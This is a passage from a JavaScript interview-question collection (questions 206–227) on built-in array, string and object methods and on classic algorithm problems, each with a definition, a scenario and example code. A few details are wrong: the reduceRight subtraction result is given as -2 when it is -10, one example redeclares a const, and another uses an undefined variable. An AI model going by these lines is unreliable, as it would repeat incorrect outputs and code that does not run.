console.log(minPathSum(grid));  // 7 (1->3->1->1->1)
```

---

### Question 206: What is the difference between `Array.prototype.findIndex()` and `Array.prototype.indexOf()`?

#### Definition
Both find element indices, but `indexOf` uses strict equality (`===`) to find a value, while `findIndex` uses a callback function to test elements. `indexOf` is for simple value matching, `findIndex` is for complex conditions. Use `indexOf` when you have the exact value, `findIndex` when you need to test properties or conditions.

#### Real-World Scenario / Case Study
Code needed to find objects by property but was using `indexOf` with object references, which always failed. Using `findIndex` with a callback that checked properties fixed the issue. The code became more flexible and correct.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];

// indexOf - find by value:
console.log(arr.indexOf(3));      // 2
console.log(arr.indexOf(10));     // -1

// findIndex - find by condition:
console.log(arr.findIndex(x => x > 3));  // 3 (first element > 3)
console.log(arr.findIndex(x => x % 2 === 0));  // 1 (first even)

// With objects:
const users = [
  { id: 1, name: 'John' },
  { id: 2, name: 'Jane' },
  { id: 3, name: 'Bob' }
];

// indexOf - won't work for objects:
const user = { id: 2, name: 'Jane' };
console.log(users.indexOf(user));  // -1 (different object reference)

// findIndex - works with conditions:
console.log(users.findIndex(u => u.id === 2));  // 1
console.log(users.findIndex(u => u.name === 'Bob'));  // 2

// Common patterns:
// Find first matching object:
const index = users.findIndex(u => u.active && u.role === 'admin');

// Find index of element matching condition:
const evenIndex = numbers.findIndex(n => n % 2 === 0);
```

---

### Question 207: How do you implement a coin change 2 problem (count ways)?

#### Definition
Coin change 2 counts the number of ways to make change for an amount using available coins. Different from minimum coins - this counts all possible combinations. Like counting all ways to make $5 with available coins. Uses dynamic programming. Order doesn't matter - [1,2,2] and [2,1,2] count as one way.

#### Real-World Scenario / Case Study
A payment system needed to count valid payment combinations. The coin change 2 algorithm provided accurate counts. The system could validate payment methods and calculate possible payment combinations for users.

#### Example Code
```js
// Count ways to make change:
function change(amount, coins) {
  const dp = new Array(amount + 1).fill(0);
  dp[0] = 1;  // One way to make 0 (use no coins)
  
  // Process each coin type:
  for (const coin of coins) {
    for (let i = coin; i <= amount; i++) {
      dp[i] += dp[i - coin];
    }
  }
  
  return dp[amount];
}

// Why order matters in iteration:
// Process coins first, then amounts - ensures order doesn't matter
// [1,2] and [2,1] count as same combination

// Usage:
console.log(change(5, [1, 2, 5]));  // 4 ways
// 1+1+1+1+1, 1+1+1+2, 1+2+2, 5

// Get all combinations:
function changeCombinations(amount, coins) {
  const result = [];
  
  function backtrack(remaining, combination, start) {
    if (remaining === 0) {
      result.push([...combination]);
      return;
    }
    
    if (remaining < 0) return;
    
    for (let i = start; i < coins.length; i++) {
      combination.push(coins[i]);
      backtrack(remaining - coins[i], combination, i);
      combination.pop();
    }
  }
  
  backtrack(amount, [], 0);
  return result;
}

console.log(changeCombinations(5, [1, 2, 5]));
// [[1,1,1,1,1], [1,1,1,2], [1,2,2], [5]]
```

---

### Question 208: What is the difference between `Number.isFinite()` and `isFinite()`?

#### Definition
Both check if a number is finite (not Infinity or NaN), but `isFinite()` does type coercion while `Number.isFinite()` is strict. `isFinite('123')` returns true (coerces to number), `Number.isFinite('123')` returns false (string is not a number). `Number.isFinite()` is more reliable.

#### Real-World Scenario / Case Study
Code was using `isFinite()` to validate numbers, but it returned true for numeric strings, causing type confusion. Switching to `Number.isFinite()` only accepted actual numbers. The validation became accurate, preventing bugs from string/number mixing.

#### Example Code
```js
// isFinite - with type coercion:
console.log(isFinite(123));        // true
console.log(isFinite('123'));      // true (coerces string to number)
console.log(isFinite(Infinity));   // false
console.log(isFinite(NaN));        // false
console.log(isFinite(null));       // true (coerces null to 0)

// Number.isFinite - strict, no coercion:
console.log(Number.isFinite(123));        // true
console.log(Number.isFinite('123'));      // false (string is not number)
console.log(Number.isFinite(Infinity));   // false
console.log(Number.isFinite(NaN));        // false
console.log(Number.isFinite(null));       // false

// Better number validation:
function isValidNumber(value) {
  return typeof value === 'number' && Number.isFinite(value);
}

// vs unreliable:
function isValidNumberBad(value) {
  return isFinite(value);  // Accepts strings!
}

// Check for finite numbers:
const result = someCalculation();
if (Number.isFinite(result)) {
  // Safe to use
} else {
  // Handle Infinity or NaN
}
```

---

### Question 209: How do you implement a maximum subarray problem (Kadane's algorithm)?

#### Definition
Maximum subarray finds the contiguous subarray with the largest sum. Like finding the best time period in stock prices. Kadane's algorithm is O(n) - keeps track of maximum sum ending at current position. Classic problem with elegant solution. Useful for financial analysis, signal processing.

#### Real-World Scenario / Case Study
A trading system needed to find the best profit period from price data. Kadane's algorithm found optimal buy/sell windows efficiently. The system could analyze thousands of price points and identify the most profitable trading periods.

#### Example Code
```js
// Kadane's algorithm - O(n):
function maxSubArray(nums) {
  let maxSoFar = nums[0];
  let maxEndingHere = nums[0];
  
  for (let i = 1; i < nums.length; i++) {
    // Either extend previous subarray or start new:
    maxEndingHere = Math.max(nums[i], maxEndingHere + nums[i]);
    maxSoFar = Math.max(maxSoFar, maxEndingHere);
  }
  
  return maxSoFar;
}

// Get actual subarray:
function maxSubArrayWithIndices(nums) {
  let maxSoFar = nums[0];
  let maxEndingHere = nums[0];
  let start = 0, end = 0, tempStart = 0;
  
  for (let i = 1; i < nums.length; i++) {
    if (maxEndingHere < 0) {
      maxEndingHere = nums[i];
      tempStart = i;
    } else {
      maxEndingHere += nums[i];
    }
    
    if (maxEndingHere > maxSoFar) {
      maxSoFar = maxEndingHere;
      start = tempStart;
      end = i;
    }
  }
  
  return {
    sum: maxSoFar,
    subarray: nums.slice(start, end + 1)
  };
}

// Usage:
console.log(maxSubArray([-2, 1, -3, 4, -1, 2, 1, -5, 4]));  // 6
console.log(maxSubArrayWithIndices([-2, 1, -3, 4, -1, 2, 1, -5, 4]));
// { sum: 6, subarray: [4, -1, 2, 1] }
```

---

### Question 210: What is the difference between `Array.prototype.toSorted()`, `toReversed()`, and their mutating counterparts?

#### Definition
The `to`-prefixed methods (`toSorted`, `toReversed`) are new non-mutating versions that return new arrays. `sort()` and `reverse()` modify the original array. The `to` versions are like making a copy first, then sorting/reversing. Use `toSorted`/`toReversed` when you want to preserve the original, `sort`/`reverse` when you want to modify in place.

#### Real-World Scenario / Case Study
Code was using `sort()` and `reverse()` which mutated original arrays, causing bugs when the original was needed elsewhere. Using `toSorted()` and `toReversed()` preserved originals while creating sorted/reversed views. This fixed multiple bugs and made the code safer.

#### Example Code
```js
const arr = [3, 1, 4, 1, 5];

// sort() - mutates original:
const sorted = arr.sort();
console.log(sorted);  // [1, 1, 3, 4, 5]
console.log(arr);     // [1, 1, 3, 4, 5] - original changed!

// toSorted() - returns new array:
const arr2 = [3, 1, 4, 1, 5];
const sorted2 = arr2.toSorted();
console.log(sorted2);  // [1, 1, 3, 4, 5]
console.log(arr2);     // [3, 1, 4, 1, 5] - original unchanged

// reverse() - mutates:
const arr3 = [1, 2, 3];
const reversed = arr3.reverse();
console.log(reversed);  // [3, 2, 1]
console.log(arr3);      // [3, 2, 1] - original changed!

// toReversed() - returns new:
const arr4 = [1, 2, 3];
const reversed2 = arr4.toReversed();
console.log(reversed2);  // [3, 2, 1]
console.log(arr4);       // [1, 2, 3] - original unchanged

// With comparators:
const users = [{ name: 'John', age: 30 }, { name: 'Jane', age: 25 }];
const sortedUsers = users.toSorted((a, b) => a.age - b.age);
// Original users array unchanged
```

---

### Question 211: How do you implement a longest valid parentheses problem?

#### Definition
Longest valid parentheses finds the length of the longest well-formed parentheses substring. Like finding the longest balanced expression. Uses stack or dynamic programming. Stack tracks unmatched parentheses positions. Useful for expression parsing or validation.

#### Real-World Scenario / Case Study
A code editor needed to highlight matching parentheses. The longest valid parentheses algorithm identified well-formed expressions. The editor could highlight balanced code blocks and detect syntax errors efficiently.

#### Example Code
```js
// Stack approach:
function longestValidParentheses(s) {
  const stack = [-1];  // Start with -1 for base
  let maxLength = 0;
  
  for (let i = 0; i < s.length; i++) {
    if (s[i] === '(') {
      stack.push(i);
    } else {
      stack.pop();
      if (stack.length === 0) {
        stack.push(i);  // New base
      } else {
        maxLength = Math.max(maxLength, i - stack[stack.length - 1]);
      }
    }
  }
  
  return maxLength;
}

// DP approach:
function longestValidParenthesesDP(s) {
  const n = s.length;
  const dp = new Array(n).fill(0);
  let maxLength = 0;
  
  for (let i = 1; i < n; i++) {
    if (s[i] === ')') {
      if (s[i - 1] === '(') {
        // ...()
        dp[i] = (i >= 2 ? dp[i - 2] : 0) + 2;
      } else if (i - dp[i - 1] > 0 && s[i - dp[i - 1] - 1] === '(') {
        // ...))
        dp[i] = dp[i - 1] + (i - dp[i - 1] >= 2 ? dp[i - dp[i - 1] - 2] : 0) + 2;
      }
      maxLength = Math.max(maxLength, dp[i]);
    }
  }
  
  return maxLength;
}

// Usage:
console.log(longestValidParentheses('(()'));      // 2
console.log(longestValidParentheses(')()())'));   // 4
console.log(longestValidParentheses(''));         // 0
```

---

### Question 212: What is the difference between `String.prototype.search()` and `String.prototype.match()`?

#### Definition
`search` finds the first match and returns its index (or -1), like `indexOf` but for regex. `match` returns the match details (the matched string, groups, index) or null. `search` is simpler when you just need the position, `match` when you need the actual match and groups. Both work with regex patterns.

#### Real-World Scenario / Case Study
Code was using `match()` just to check if a pattern existed, which was inefficient. Using `search() !== -1` was simpler and faster. The team also used `match()` when they needed capture groups, making the code more appropriate for each use case.

#### Example Code
```js
const text = 'Hello 123 World';

// search - returns index:
console.log(text.search(/\d+/));      // 6 (first digit position)
console.log(text.search(/xyz/));      // -1 (not found)

// match - returns match details:
console.log(text.match(/\d+/));       
// ['123', index: 6, input: 'Hello 123 World', groups: undefined]

console.log(text.match(/xyz/));        // null

// With global flag:
console.log(text.match(/\d+/g));      // ['123'] (array of matches)
console.log(text.search(/\d+/g));     // 6 (global flag ignored)

// With capture groups:
const date = '2023-10-15';
const match = date.match(/(\d{4})-(\d{2})-(\d{2})/);
console.log(match);
// ['2023-10-15', '2023', '10', '15', index: 0, ...]

// When to use which:
// Just check if pattern exists:
if (text.search(/\d+/) !== -1) { }  // Simple

// Need the match:
const match = text.match(/\d+/);
if (match) {
  console.log(match[0]);  // '123'
}

// Need capture groups:
const groups = text.match(/(\d+)/);
if (groups) {
  console.log(groups[1]);  // '123' (first group)
}
```

---

### Question 213: How do you implement a trapping rain water problem?

#### Definition
Trapping rain water calculates how much water can be trapped between bars of different heights. Like calculating rainwater between buildings. Uses two pointers or stack approach. For each position, water trapped = min(max left, max right) - current height. Classic array problem.

#### Real-World Scenario / Case Study
A water management system needed to calculate water storage capacity. The trapping rain water algorithm provided accurate calculations. The system could optimize water collection and storage based on terrain heights.

#### Example Code
```js
// Two pointers approach O(n):
function trap(height) {
  if (height.length === 0) return 0;
  
  let left = 0;
  let right = height.length - 1;
  let leftMax = 0;
  let rightMax = 0;
  let water = 0;
  
  while (left < right) {
    if (height[left] < height[right]) {
      if (height[left] >= leftMax) {
        leftMax = height[left];
      } else {
        water += leftMax - height[left];
      }
      left++;
    } else {
      if (height[right] >= rightMax) {
        rightMax = height[right];
      } else {
        water += rightMax - height[right];
      }
      right--;
    }
  }
  
  return water;
}

// Stack approach:
function trapStack(height) {
  const stack = [];
  let water = 0;
  
  for (let i = 0; i < height.length; i++) {
    while (stack.length > 0 && height[i] > height[stack[stack.length - 1]]) {
      const top = stack.pop();
      if (stack.length === 0) break;
      
      const distance = i - stack[stack.length - 1] - 1;
      const boundedHeight = Math.min(height[i], height[stack[stack.length - 1]]) - height[top];
      water += distance * boundedHeight;
    }
    stack.push(i);
  }
  
  return water;
}

// Usage:
console.log(trap([0,1,0,2,1,0,1,3,2,1,2,1]));  // 6
```

---

### Question 214: What is the difference between `Object.getOwnPropertyDescriptor()` and checking properties directly?

#### Definition
`getOwnPropertyDescriptor` returns detailed information about a property (value, writable, enumerable, configurable) - like getting a property's full ID card. Direct checking just sees if it exists. `getOwnPropertyDescriptor` reveals hidden details like whether a property can be modified or deleted. Useful for introspection or property manipulation.

#### Real-World Scenario / Case Study
Code needed to check if properties were writable before modifying them. Direct property access didn't reveal this. Using `getOwnPropertyDescriptor` allowed checking writable/configurable flags, preventing errors when trying to modify read-only properties.

#### Example Code
```js
const obj = {
  name: 'John',
  age: 30
};

Object.defineProperty(obj, 'readonly', {
  value: 'cannot change',
  writable: false,
  enumerable: true,
  configurable: false
});

// Direct access - just gets value:
console.log(obj.name);        // 'John'
console.log(obj.readonly);    // 'cannot change'

// getOwnPropertyDescriptor - gets full details:
const desc = Object.getOwnPropertyDescriptor(obj, 'name');
console.log(desc);
// {
//   value: 'John',
//   writable: true,
//   enumerable: true,
//   configurable: true
// }

const readonlyDesc = Object.getOwnPropertyDescriptor(obj, 'readonly');
console.log(readonlyDesc.writable);  // false
console.log(readonlyDesc.configurable);  // false

// Check before modifying:
const propDesc = Object.getOwnPropertyDescriptor(obj, 'readonly');
if (propDesc.writable) {
  obj.readonly = 'new value';  // Safe to modify
} else {
  console.log('Property is read-only');
}

// Get all descriptors:
const allDescriptors = Object.getOwnPropertyDescriptors(obj);
// Returns object with all property descriptors
```

---

### Question 215: How do you implement a container with most water problem?

#### Definition
Container with most water finds two lines that form a container holding the most water. Like finding the best two walls to build a water tank between. Uses two pointers - start from both ends, move the shorter pointer inward. Area = min(height[left], height[right]) × width. Classic two-pointer problem.

#### Real-World Scenario / Case Study
A design system needed to optimize container dimensions. The algorithm found optimal pairs efficiently. The system could calculate maximum areas for UI layouts, improving design efficiency.

#### Example Code
```js
function maxArea(height) {
  let left = 0;
  let right = height.length - 1;
  let maxArea = 0;
  
  while (left < right) {
    const width = right - left;
    const currentArea = Math.min(height[left], height[right]) * width;
    maxArea = Math.max(maxArea, currentArea);
    
    // Move pointer with smaller height:
    if (height[left] < height[right]) {
      left++;
    } else {
      right--;
    }
  }
  
  return maxArea;
}

// Why move smaller pointer:
// Area is limited by smaller height
// Moving larger pointer can only decrease area (width decreases, height same or smaller)
// Moving smaller pointer might find larger height

// Usage:
console.log(maxArea([1,8,6,2,5,4,8,3,7]));  // 49
// Container between indices 1 and 8: min(8,7) × 7 = 49
```

---

### Question 216: What is the difference between `Array.prototype.toSpliced()`, `toSorted()`, and their mutating versions?

#### Definition
The `to`-prefixed methods are new non-mutating versions that return new arrays. `splice()`, `sort()`, `reverse()` modify the original. `toSpliced` is like `splice` but returns a new array. These methods make functional programming easier - you can chain operations without worrying about mutations.

#### Real-World Scenario / Case Study
Code was chaining array operations but mutations were causing bugs. Using `toSorted()`, `toReversed()`, and `toSpliced()` allowed safe chaining. The code became more predictable and easier to reason about.

#### Example Code
```js
const arr = [3, 1, 4, 1, 5];

// Mutating methods:
arr.sort();        // Modifies arr
arr.reverse();     // Modifies arr
arr.splice(1, 2);  // Modifies arr

// Non-mutating 'to' methods:
const sorted = arr.toSorted();      // New array
const reversed = arr.toReversed();   // New array
const spliced = arr.toSpliced(1, 2); // New array

// Safe chaining:
const result = arr
  .toSorted()
  .toReversed()
  .toSpliced(0, 1);
// Original arr unchanged

// vs mutating (breaks chaining):
const result2 = arr
  .sort()      // Modifies arr
  .reverse()   // Modifies already sorted arr
  .splice(0, 1);  // Modifies again, returns removed elements not array!

// toSpliced parameters (same as splice):
const arr2 = [1, 2, 3, 4, 5];
const newArr = arr2.toSpliced(1, 2, 'a', 'b');
// Remove 2 elements from index 1, insert 'a', 'b'
// [1, 'a', 'b', 4, 5]
// Original arr2 unchanged
```

---

### Question 217: How do you implement a regular expression matching problem (dynamic programming)?

#### Definition
Regex matching determines if a string matches a pattern with special characters like `.` (any char) and `*` (zero or more of preceding). Like a simplified regex engine. Uses dynamic programming to handle the complexity. Classic DP problem that's essentially building a regex matcher.

#### Real-World Scenario / Case Study
A text processing system needed custom pattern matching. Implementing regex matching with DP provided efficient pattern validation. The system could validate user input patterns and match text against complex rules.

#### Example Code
```js
function isMatch(s, p) {
  const m = s.length;
  const n = p.length;
  const dp = Array(m + 1).fill(null).map(() => Array(n + 1).fill(false));
  
  // Empty string matches empty pattern:
  dp[0][0] = true;
  
  // Handle patterns like a*, a*b*, etc. (can match empty):
  for (let j = 1; j <= n; j++) {
    if (p[j - 1] === '*') {
      dp[0][j] = dp[0][j - 2];
    }
  }
  
  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      if (p[j - 1] === s[i - 1] || p[j - 1] === '.') {
        // Characters match:
        dp[i][j] = dp[i - 1][j - 1];
      } else if (p[j - 1] === '*') {
        // Zero occurrences:
        dp[i][j] = dp[i][j - 2];
        
        // One or more occurrences:
        if (p[j - 2] === s[i - 1] || p[j - 2] === '.') {
          dp[i][j] = dp[i][j] || dp[i - 1][j];
        }
      }
    }
  }
  
  return dp[m][n];
}

// Usage:
console.log(isMatch('aa', 'a'));      // false
console.log(isMatch('aa', 'a*'));     // true
console.log(isMatch('ab', '.*'));     // true
console.log(isMatch('aab', 'c*a*b')); // true
```

---

### Question 218: What is the difference between `String.prototype.replace()` with function and string replacement?

#### Definition
`replace` can take a string (replaces first match) or function (called for each match with match details). The function receives the match, groups, index, and original string. Function replacement is powerful - you can compute the replacement dynamically. Use string for simple replacement, function for dynamic replacement.

#### Real-World Scenario / Case Study
Code needed to replace matches with computed values (like incrementing numbers). Using a replacement function allowed dynamic replacements. The system could transform text with complex rules, enabling powerful text processing features.

#### Example Code
```js
const text = 'Hello 123 and 456';

// String replacement - simple:
const replaced1 = text.replace(/\d+/, 'NUMBER');
console.log(replaced1);  // 'Hello NUMBER and 456' (first match)

// Function replacement - dynamic:
const replaced2 = text.replace(/\d+/g, (match) => {
  return parseInt(match) * 2;  // Double the number
});
console.log(replaced2);  // 'Hello 246 and 912'

// Function with groups:
const text2 = 'John Doe, Jane Smith';
const replaced3 = text2.replace(/(\w+) (\w+)/g, (match, first, last) => {
  return `${last}, ${first}`;  // Swap first and last
});
console.log(replaced3);  // 'Doe, John, Smith, Jane'

// Function with full match info:
const replaced4 = text.replace(/\d+/g, (match, offset, string) => {
  console.log(`Found ${match} at position ${offset} in "${string}"`);
  return `[${match}]`;
});

// Common use cases:
// Format numbers:
'Price: 1234'.replace(/\d+/, (m) => 
  parseInt(m).toLocaleString()
);  // 'Price: 1,234'

// Escape HTML:
'<div>'.replace(/[<>&"']/g, (m) => {
  const map = { '<': '&lt;', '>': '&gt;', '&': '&amp;' };
  return map[m] || m;
});
```

---

### Question 219: How do you implement a wildcard matching problem?

#### Definition
Wildcard matching checks if a string matches a pattern with `?` (single char) and `*` (any sequence). Like a simplified glob pattern matcher. Uses dynamic programming. `?` matches any single character, `*` matches any sequence (including empty). More complex than simple regex due to `*` matching sequences.

#### Real-World Scenario / Case Study
A file search system needed wildcard pattern matching. The algorithm provided efficient matching. Users could search with patterns like `*.js` or `test?.txt`, and the system found matching files quickly.

#### Example Code
```js
function isMatch(s, p) {
  const m = s.length;
  const n = p.length;
  const dp = Array(m + 1).fill(null).map(() => Array(n + 1).fill(false));
  
  // Empty string matches empty pattern:
  dp[0][0] = true;
  
  // Handle leading * (can match empty):
  for (let j = 1; j <= n; j++) {
    if (p[j - 1] === '*') {
      dp[0][j] = dp[0][j - 1];
    }
  }
  
  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      if (p[j - 1] === s[i - 1] || p[j - 1] === '?') {
        // Characters match or ? matches any:
        dp[i][j] = dp[i - 1][j - 1];
      } else if (p[j - 1] === '*') {
        // * can match:
        // 1. Zero characters: dp[i][j-1]
        // 2. One or more: dp[i-1][j]
        dp[i][j] = dp[i][j - 1] || dp[i - 1][j];
      }
    }
  }
  
  return dp[m][n];
}

// Usage:
console.log(isMatch('aa', 'a'));      // false
console.log(isMatch('aa', '*'));      // true
console.log(isMatch('cb', '?a'));     // false
console.log(isMatch('adceb', '*a*b')); // true
console.log(isMatch('acdcb', 'a*c?b')); // false
```

---

### Question 220: What is the difference between `Array.prototype.with()` and direct index assignment?

#### Definition
`with()` is a new non-mutating method that returns a new array with one element changed. Direct assignment (`arr[0] = value`) mutates the original array. `with()` is like making a copy and changing one element. Use `with()` when you want to preserve the original, direct assignment when you want to modify in place.

#### Real-World Scenario / Case Study
Code was mutating arrays when updating single elements, causing bugs when originals were needed. Using `with()` created updated copies safely. React-like state updates became possible, making the code more predictable.

#### Example Code
```js
const arr = [1, 2, 3, 4, 5];

// Direct assignment - mutates:
arr[0] = 10;
console.log(arr);  // [10, 2, 3, 4, 5] - original changed

// with() - returns new array:
const arr2 = [1, 2, 3, 4, 5];
const newArr = arr2.with(0, 10);
console.log(newArr);  // [10, 2, 3, 4, 5]
console.log(arr2);    // [1, 2, 3, 4, 5] - original unchanged

// Negative indices:
const newArr2 = arr2.with(-1, 99);
console.log(newArr2);  // [1, 2, 3, 4, 99] (last element changed)

// Common use case - immutable updates:
function updateItem(items, index, newValue) {
  return items.with(index, newValue);  // New array, original unchanged
}

// vs mutating:
function updateItemBad(items, index, newValue) {
  items[index] = newValue;  // Mutates original!
  return items;
}

// Chaining:
const result = arr
  .with(0, 10)
  .with(2, 30)
  .toSorted();
// Multiple immutable updates
```

---

### Question 221: How do you implement a palindrome partitioning problem?

#### Definition
Palindrome partitioning finds all ways to partition a string such that every substring is a palindrome. Like cutting a string into pieces where each piece reads the same forwards and backwards. Uses backtracking with memoization. Useful for text analysis or string processing.

#### Real-World Scenario / Case Study
A text analysis tool needed to identify palindromic segments in strings. The partitioning algorithm found all valid segmentations. The system could analyze text structure and identify palindromic patterns efficiently.

#### Example Code
```js
function partition(s) {
  const result = [];
  const current = [];
  
  function isPalindrome(str, left, right) {
    while (left < right) {
      if (str[left] !== str[right]) return false;
      left++;
      right--;
    }
    return true;
  }
  
  function backtrack(start) {
    if (start === s.length) {
      result.push([...current]);
      return;
    }
    
    for (let end = start; end < s.length; end++) {
      if (isPalindrome(s, start, end)) {
        current.push(s.substring(start, end + 1));
        backtrack(end + 1);
        current.pop();
      }
    }
  }
  
  backtrack(0);
  return result;
}

// Usage:
console.log(partition('aab'));
// [['a','a','b'], ['aa','b']]
```

---

### Question 222: What is the difference between `Object.entries()` and `Object.fromEntries()`?

#### Definition
`entries` converts an object to an array of [key, value] pairs - like making a list of all key-value pairs. `fromEntries` does the reverse - converts an array of [key, value] pairs back to an object. They're inverse operations. Useful for transforming objects, filtering properties, or converting between formats.

#### Real-World Scenario / Case Study
Code needed to filter object properties but objects don't have a `filter` method. Using `Object.entries()` converted to array, allowed filtering, then `fromEntries()` converted back. This pattern became common for object transformations.

#### Example Code
```js
const obj = { a: 1, b: 2, c: 3 };

// entries - object to array:
const entries = Object.entries(obj);
console.log(entries);  // [['a', 1], ['b', 2], ['c', 3]]

// fromEntries - array to object:
const newObj = Object.fromEntries(entries);
console.log(newObj);  // { a: 1, b: 2, c: 3 }

// Common use case - filter object:
const filtered = Object.fromEntries(
  Object.entries(obj).filter(([key, value]) => value > 1)
);
console.log(filtered);  // { b: 2, c: 3 }

// Transform object:
const transformed = Object.fromEntries(
  Object.entries(obj).map(([key, value]) => [key.toUpperCase(), value * 2])
);
console.log(transformed);  // { A: 2, B: 4, C: 6 }

// Swap keys and values:
const swapped = Object.fromEntries(
  Object.entries(obj).map(([key, value]) => [value, key])
);
console.log(swapped);  // { 1: 'a', 2: 'b', 3: 'c' }
```

---

### Question 223: How do you implement a word ladder problem (BFS)?

#### Definition
Word ladder finds the shortest transformation sequence from one word to another, changing one letter at a time, where each intermediate word must be in a dictionary. Like a game where you change "cat" to "dog" one letter at a time. Uses BFS to find shortest path. Classic graph problem.

#### Real-World Scenario / Case Study
A word game needed to find transformation paths between words. The word ladder algorithm found optimal paths. The system could suggest valid word sequences, enabling game features like "find the path from START to END".

#### Example Code
```js
function ladderLength(beginWord, endWord, wordList) {
  const wordSet = new Set(wordList);
  if (!wordSet.has(endWord)) return 0;
  
  const queue = [[beginWord, 1]];
  const visited = new Set([beginWord]);
  
  while (queue.length > 0) {
    const [word, length] = queue.shift();
    
    if (word === endWord) {
      return length;
    }
    
    // Generate all possible one-letter changes:
    for (let i = 0; i < word.length; i++) {
      for (let c = 97; c <= 122; c++) {  // a-z
        const newWord = word.substring(0, i) + String.fromCharCode(c) + word.substring(i + 1);
        
        if (wordSet.has(newWord) && !visited.has(newWord)) {
          visited.add(newWord);
          queue.push([newWord, length + 1]);
        }
      }
    }
  }
  
  return 0;  // No path found
}

// Get actual path:
function findLadder(beginWord, endWord, wordList) {
  const wordSet = new Set(wordList);
  if (!wordSet.has(endWord)) return [];
  
  const queue = [[beginWord, [beginWord]]];
  const visited = new Set([beginWord]);
  
  while (queue.length > 0) {
    const [word, path] = queue.shift();
    
    if (word === endWord) {
      return path;
    }
    
    for (let i = 0; i < word.length; i++) {
      for (let c = 97; c <= 122; c++) {
        const newWord = word.substring(0, i) + String.fromCharCode(c) + word.substring(i + 1);
        
        if (wordSet.has(newWord) && !visited.has(newWord)) {
          visited.add(newWord);
          queue.push([newWord, [...path, newWord]]);
        }
      }
    }
  }
  
  return [];
}

// Usage:
console.log(ladderLength('hit', 'cog', ['hot','dot','dog','lot','log','cog']));  // 5
```

---

### Question 224: What is the difference between `Array.prototype.reduce()` and `Array.prototype.reduceRight()` in practice?

#### Definition
Both combine array elements, but `reduce` processes left-to-right while `reduceRight` processes right-to-left. For commutative operations (addition, multiplication), order doesn't matter. For non-commutative operations (subtraction, division, string building), order matters significantly. Use `reduce` for left-to-right, `reduceRight` for right-to-left processing.

#### Real-World Scenario / Case Study
Code was building strings with `reduce`, but needed right-to-left order for correct formatting. Using `reduceRight` fixed the order issue. The team learned when order matters and chose the appropriate method.

#### Example Code
```js
const arr = [1, 2, 3, 4];

// Commutative operations - order doesn't matter:
const sum1 = arr.reduce((a, b) => a + b, 0);      // 10
const sum2 = arr.reduceRight((a, b) => a + b, 0);  // 10 (same)

// Non-commutative - order matters:
const sub1 = arr.reduce((a, b) => a - b, 0);      // -10 (0-1-2-3-4)
const sub2 = arr.reduceRight((a, b) => a - b, 0); // -2 (0-4-3-2-1)

// String building - order matters:
const words = ['Hello', 'World', '!'];
const sentence1 = words.reduce((a, b) => a + ' ' + b);  // 'Hello World !'
const sentence2 = words.reduceRight((a, b) => a + ' ' + b);  // '! World Hello'

// Function composition:
const functions = [x => x + 1, x => x * 2, x => x - 3];
const composed1 = functions.reduce((f, g) => x => f(g(x)));
// Applies right to left: (x-3)*2+1

const composed2 = functions.reduceRight((f, g) => x => f(g(x)));
// Applies left to right: (x+1)*2-3
```

---

### Question 225: How do you implement a jump game problem (greedy algorithm)?

#### Definition
Jump game determines if you can reach the last index starting from the first, where each element represents maximum jump length from that position. Like a board game where numbers tell you how far you can move. Uses greedy algorithm - track the farthest reachable position. More efficient than DP.

#### Real-World Scenario / Case Study
A pathfinding system needed to check if destinations were reachable. The jump game algorithm verified reachability efficiently. The system could validate routes and suggest alternative paths when direct paths weren't possible.

#### Example Code
```js
// Can jump to last index?
function canJump(nums) {
  let maxReach = 0;
  
  for (let i = 0; i < nums.length; i++) {
    if (i > maxReach) {
      return false;  // Can't reach this position
    }
    maxReach = Math.max(maxReach, i + nums[i]);
    
    if (maxReach >= nums.length - 1) {
      return true;  // Can reach the end
    }
  }
  
  return false;
}

// Minimum jumps to reach end:
function jump(nums) {
  let jumps = 0;
  let currentEnd = 0;
  let farthest = 0;
  
  for (let i = 0; i < nums.length - 1; i++) {
    farthest = Math.max(farthest, i + nums[i]);
    
    if (i === currentEnd) {
      jumps++;
      currentEnd = farthest;
    }
  }
  
  return jumps;
}

// Usage:
console.log(canJump([2, 3, 1, 1, 4]));  // true
console.log(canJump([3, 2, 1, 0, 4]));  // false
console.log(jump([2, 3, 1, 1, 4]));     // 2 jumps
```

---

### Question 226: What is the difference between `String.prototype.split()` and `String.prototype.match()` with global flag?

#### Definition
`split` divides a string into an array by a separator (removes the separator). `match` with global flag finds all matches and returns them as an array (keeps the matches). `split` is for breaking apart, `match` is for finding patterns. Use `split` to separate by delimiters, `match` to extract patterns.

#### Real-World Scenario / Case Study
Code needed to extract all numbers from text. Using `split` was complex and error-prone. Using `match` with a regex pattern extracted all numbers cleanly. The code became simpler and more reliable.

#### Example Code
```js
const text = 'Hello 123 World 456';

// split - breaks by separator:
const words = text.split(' ');
console.log(words);  // ['Hello', '123', 'World', '456']

const byNumber = text.split(/\d+/);
console.log(byNumber);  // ['Hello ', ' World ', ''] (removes numbers)

// match with global - finds all matches:
const numbers = text.match(/\d+/g);
console.log(numbers);  // ['123', '456'] (keeps matches)

// Common use cases:
// Extract words:
const words2 = text.match(/\w+/g);  // ['Hello', '123', 'World', '456']

// Extract emails:
const emails = 'Contact: john@example.com or jane@test.com';
const emailList = emails.match(/[\w.-]+@[\w.-]+\.\w+/g);
// ['john@example.com', 'jane@test.com']

// Split by multiple delimiters:
const data = 'a,b;c d';
const parts = data.split(/[,;\s]+/);  // ['a', 'b', 'c', 'd']

// vs match (finds delimiters):
const delimiters = data.match(/[,;\s]+/g);  // [',', ';', ' ']
```

---

### Question 227: How do you implement a merge intervals problem?

#### Definition
Merge intervals combines overlapping intervals into merged intervals. Like merging overlapping time slots in a calendar. Sort intervals by start time, then merge adjacent overlapping ones. Useful for scheduling, calendar apps, or range operations.

#### Real-World Scenario / Case Study
A calendar system needed to merge overlapping events. The merge intervals algorithm consolidated events efficiently. Users could see consolidated time blocks, making the calendar more readable and manageable.

#### Example Code
```js
function merge(intervals) {
  if (intervals.length <= 1) return intervals;
  
  // Sort by start time:
  intervals.sort((a, b) => a[0] - b[0]);
  
  const merged = [intervals[0]];
  
  for (let i = 1; i < intervals.length; i++) {
    const current = intervals[i];
    const lastMerged = merged[merged.length - 1];
    
    // If current overlaps with last merged:
    if (current[0] <= lastMerged[1]) {
      // Merge: extend end time if needed
      lastMerged[1] = Math.max(lastMerged[1], current[1]);
    } else {
      // No overlap, add as new interval
      merged.push(current);
    }
  }
  
  return merged;
}

// Usage:
